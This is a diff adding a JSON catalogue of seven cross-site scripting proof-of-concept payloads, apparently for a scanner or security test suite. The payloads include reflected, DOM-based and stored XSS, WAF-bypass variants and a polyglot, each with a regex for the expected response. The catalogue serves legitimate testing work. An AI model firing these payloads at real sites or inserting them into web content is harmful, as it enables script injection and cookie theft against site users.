@@ -1,0 +1,93 @@
+[
+    {
+        "poc_id": "xss-reflected-basic-001",
+        "vuln_type": "xss",
+        "title": "Basic Reflected XSS via script tag",
+        "tech_stack": ["php"],
+        "cve_ids": [],
+        "cvss_score": 6.1,
+        "payload": "<script>alert(document.domain)</script>",
+        "expected_response": "<script>alert\\(document\\.domain\\)</script>",
+        "waf_bypass": false,
+        "severity": "MEDIUM",
+        "description": "Simple reflected XSS when output is not HTML-encoded"
+    },
+    {
+        "poc_id": "xss-reflected-attr-002",
+        "vuln_type": "xss",
+        "title": "Reflected XSS via HTML attribute breakout",
+        "tech_stack": ["php", "asp.net"],
+        "cve_ids": [],
+        "cvss_score": 6.1,
+        "payload": "\"><svg/onload=alert(1)>",
+        "expected_response": "<svg/onload=alert\\(1\\)>",
+        "waf_bypass": false,
+        "severity": "MEDIUM",
+        "description": "Attribute context breakout using SVG onload event handler"
+    },
+    {
+        "poc_id": "xss-reflected-img-003",
+        "vuln_type": "xss",
+        "title": "Reflected XSS via img onerror",
+        "tech_stack": ["php", "java", "python"],
+        "cve_ids": [],
+        "cvss_score": 6.1,
+        "payload": "<img src=x onerror=alert(document.cookie)>",
+        "expected_response": "onerror=alert\\(document\\.cookie\\)",
+        "waf_bypass": false,
+        "severity": "MEDIUM",
+        "description": "Image tag with invalid src triggering onerror JavaScript execution"
+    },
+    {
+        "poc_id": "xss-dom-hashbang-004",
+        "vuln_type": "xss",
+        "title": "DOM XSS via location.hash sink",
+        "tech_stack": ["javascript", "react", "angular"],
+        "cve_ids": [],
+        "cvss_score": 6.1,
+        "payload": "#<img src=x onerror=alert(1)>",
+        "expected_response": "alert\\(1\\)",
+        "waf_bypass": false,
+        "severity": "MEDIUM",
+        "description": "DOM-based XSS through unsafe innerHTML assignment from location.hash"
+    },
+    {
+        "poc_id": "xss-stored-comment-005",
+        "vuln_type": "xss",
+        "title": "Stored XSS in comment field",
+        "tech_stack": ["php", "wordpress"],
+        "cve_ids": [],
+        "cvss_score": 7.2,
+        "payload": "<details open ontoggle=alert(1)>",
+        "expected_response": "ontoggle=alert\\(1\\)",
+        "waf_bypass": false,
+        "severity": "HIGH",
+        "description": "Stored XSS using details/ontoggle which bypasses many sanitizers"
+    },
+    {
+        "poc_id": "xss-waf-bypass-case-006",
+        "vuln_type": "xss",
+        "title": "XSS WAF bypass via case mixing and encoding",
+        "tech_stack": ["php", "asp.net"],
+        "cve_ids": [],
+        "cvss_score": 6.1,
+        "payload": "<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>",
+        "expected_response": "alert\\(",
+        "waf_bypass": true,
+        "severity": "MEDIUM",
+        "description": "Case-mixed script tag to bypass simple keyword WAF rules"
+    },
+    {
+        "poc_id": "xss-waf-bypass-encoding-007",
+        "vuln_type": "xss",
+        "title": "XSS WAF bypass via JavaScript URI encoding",
+        "tech_stack": ["php", "java"],
+        "cve_ids": [],
+        "cvss_score": 6.1,
+        "payload": "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "expected_response": "alert\\(1\\)",
+        "waf_bypass": true,
+        "severity": "MEDIUM",
+        "description": "Polyglot XSS payload effective across multiple injection contexts"
+    }
+]
